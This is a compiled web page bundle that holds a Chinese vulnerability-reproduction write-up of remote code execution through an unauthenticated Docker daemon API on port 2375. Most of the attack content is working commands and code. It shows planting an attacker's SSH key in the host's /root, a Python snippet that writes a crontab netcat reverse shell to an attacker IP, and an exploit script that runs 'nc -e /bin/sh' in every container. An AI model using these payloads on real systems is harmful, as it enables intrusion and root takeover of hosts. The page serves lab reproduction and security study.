import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as p,c as i,a as n,b as s,d as e,e as c}from"./app-58e4a7d6.js";const r={},l=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),u=n("p",null,"Docker 是一个开源的应用容器引擎，让开发者可以打包应用及依赖包到一个轻量级、可移植的容器中，然后发布到 Linux 机器上，也可以实现虚拟化。Docker swarm 是 Docker 的集群管理工具，提供了标准的 Docker API。",-1),d=n("p",null,"在使用 Docker swarm 的时候，管理的 Docker节点上会开放一个 TCP 端口 2375，绑定在 0.0.0.0 上，直接 HTTP 访问会返回 “404 Not Found”。可以通过该 API 执行 Docker 命令，例如创建/删除 container、拉取 image、执行反弹 shell。",-1),k=n("p",null,"参考链接：",-1),m={href:"http://www.loner.fm/drops/#!/drops/1203.%E6%96%B0%E5%A7%BF%E5%8A%BF%E4%B9%8BDocker%20Remote%20API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8",target:"_blank",rel:"noopener noreferrer"},v={href:"http://www.loner.fm/drops/#!/drops/1203.%E6%96%B0%E5%A7%BF%E5%8A%BF%E4%B9%8BDocker",target:"_blank",rel:"noopener noreferrer"},h=c(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub编译及启动漏洞环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose build
docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>环境启动后，将监听2375端口。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><h3 id="查看容器" tabindex="-1"><a class="header-anchor" href="#查看容器" aria-hidden="true">#</a> 查看容器</h3><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://your-ip:2375/containers/json
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="执行命令" tabindex="-1"><a class="header-anchor" href="#执行命令" aria-hidden="true">#</a> 执行命令</h3><p>列出所有镜像：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker -H tcp://your-ip:2375 images
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>列出所有容器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker -H tcp://your-ip:2375 ps -a
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>启动一个已经停止的容器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker -H tcp://your-ip:2375 start &lt;container ID&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>连接一个已经停止的容器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker -H tcp://your-ip:2375 attach &lt;container ID&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="获取权限" tabindex="-1"><a class="header-anchor" href="#获取权限" aria-hidden="true">#</a> 获取权限</h3><h4 id="写入-ssh-公钥" tabindex="-1"><a class="header-anchor" href="#写入-ssh-公钥" aria-hidden="true">#</a> 写入 ssh 公钥</h4><p>启动一个容器，挂载宿主机的 <code>/root</code> 目录，之后将攻击者的 ssh 公钥 <code>~/.ssh/id_rsa.pub</code> 的内容写到入宿主机的 <code>/root/.ssh/authorized_keys</code> 文件中，之后就可以用 root 账户直接登录了。</p><p>本地获取 ssh 公钥：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>ssh-keygen -t rsa
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h4 id="反弹-shell" tabindex="-1"><a class="header-anchor" href="#反弹-shell" aria-hidden="true">#</a> 反弹 shell</h4><p>随意启动一个容器，并将宿主机的<code>/etc</code>目录挂载到容器中，便可以任意读写文件了。可以将命令写入crontab配置文件，进行反弹shell。</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>import docker

client = docker.DockerClient(base_url=&#39;http://[docker ip]:2375/&#39;)
data = client.containers.run(&#39;alpine:latest&#39;, r&#39;&#39;&#39;sh -c &quot;echo &#39;* * * * * /usr/bin/nc [your ip] 2333 -e /bin/sh&#39; &gt;&gt; /tmp/etc/crontabs/root&quot; &#39;&#39;&#39;, remove=True, volumes={&#39;/etc&#39;: {&#39;bind&#39;: &#39;/tmp/etc&#39;, &#39;mode&#39;: &#39;rw&#39;}})
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>监听2333端口，接收反弹shell。</p><p>此处的反弹shell需要和/etc/crontabs/root文件同时写入，不能后续追加。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202221825647.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞exp" tabindex="-1"><a class="header-anchor" href="#漏洞exp" aria-hidden="true">#</a> 漏洞EXP</h2><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">from</span> __future__ <span class="token keyword">import</span> print_function
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> logging
<span class="token keyword">import</span> json
<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse

<span class="token comment"># NOTE</span>
<span class="token comment"># Enable Remote API with the following command</span>
<span class="token comment"># /usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock</span>
<span class="token comment"># This is an intended feature, remember to filter the port 2375..</span>

name          <span class="token operator">=</span> <span class="token string">&quot;docker&quot;</span>
description   <span class="token operator">=</span> <span class="token string">&quot;Docker RCE via Open Docker API on port 2375&quot;</span>
author        <span class="token operator">=</span> <span class="token string">&quot;Swissky&quot;</span>

<span class="token comment"># Step 1 - Extract id and name from each container</span>
ip   <span class="token operator">=</span> <span class="token string">&quot;127.0.0.1&quot;</span>
port <span class="token operator">=</span> <span class="token string">&quot;2375&quot;</span>
data <span class="token operator">=</span> <span class="token string">&quot;containers/json&quot;</span>
url  <span class="token operator">=</span> <span class="token string">&quot;http://{}:{}/{}&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>

<span class="token keyword">if</span> r<span class="token punctuation">.</span>json<span class="token punctuation">:</span>
    <span class="token keyword">for</span> container <span class="token keyword">in</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        container_id   <span class="token operator">=</span> container<span class="token punctuation">[</span><span class="token string">&#39;Id&#39;</span><span class="token punctuation">]</span>
        container_name <span class="token operator">=</span> container<span class="token punctuation">[</span><span class="token string">&#39;Names&#39;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&#39;/&#39;</span><span class="token punctuation">,</span><span class="token string">&#39;&#39;</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">(</span>container_id<span class="token punctuation">,</span> container_name<span class="token punctuation">)</span><span class="token punctuation">)</span>

        <span class="token comment"># Step 2 - Prepare command</span>
        cmd <span class="token operator">=</span> <span class="token string">&#39;[&quot;nc&quot;, &quot;192.168.1.2&quot;, &quot;4242&quot;, &quot;-e&quot;, &quot;/bin/sh&quot;]&#39;</span>
        data <span class="token operator">=</span> <span class="token string">&quot;containers/{}/exec&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>container_name<span class="token punctuation">)</span>
        url <span class="token operator">=</span> <span class="token string">&quot;http://{}:{}/{}&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
        post_json <span class="token operator">=</span> <span class="token string">&#39;{ &quot;AttachStdin&quot;:false,&quot;AttachStdout&quot;:true,&quot;AttachStderr&quot;:true, &quot;Tty&quot;:false, &quot;Cmd&quot;:&#39;</span><span class="token operator">+</span>cmd<span class="token operator">+</span><span class="token string">&#39; }&#39;</span>
        post_header <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;Content-Type&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;application/json&quot;</span>
        <span class="token punctuation">}</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> json<span class="token operator">=</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>post_json<span class="token punctuation">)</span><span class="token punctuation">)</span>


        <span class="token comment"># Step 3 - Execute command</span>
        id_cmd <span class="token operator">=</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&#39;Id&#39;</span><span class="token punctuation">]</span>
        data <span class="token operator">=</span> <span class="token string">&quot;exec/{}/start&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>id_cmd<span class="token punctuation">)</span>
        url <span class="token operator">=</span> <span class="token string">&quot;http://{}:{}/{}&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
        post_json <span class="token operator">=</span> <span class="token string">&#39;{ &quot;Detach&quot;:false,&quot;Tty&quot;:false}&#39;</span>
        post_header <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;Content-Type&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;application/json&quot;</span>
        <span class="token punctuation">}</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> json<span class="token operator">=</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>post_json<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,29);function b(g,_){const a=o("ExternalLinkIcon");return p(),i("div",null,[l,u,d,k,n("ul",null,[n("li",null,[s("["),n("a",m,[s("http://www.loner.fm/drops/#!/drops/1203.新姿势之Docker Remote API未授权访问漏洞分析和利用"),e(a)]),s("]("),n("a",v,[s("http://www.loner.fm/drops/#!/drops/1203.新姿势之Docker"),e(a)]),s(" Remote API未授权访问漏洞分析和利用)")])]),h])}const f=t(r,[["render",b],["__file","Docker daemon api 未授权访问漏洞 RCE.html.vue"]]);export{f as default};
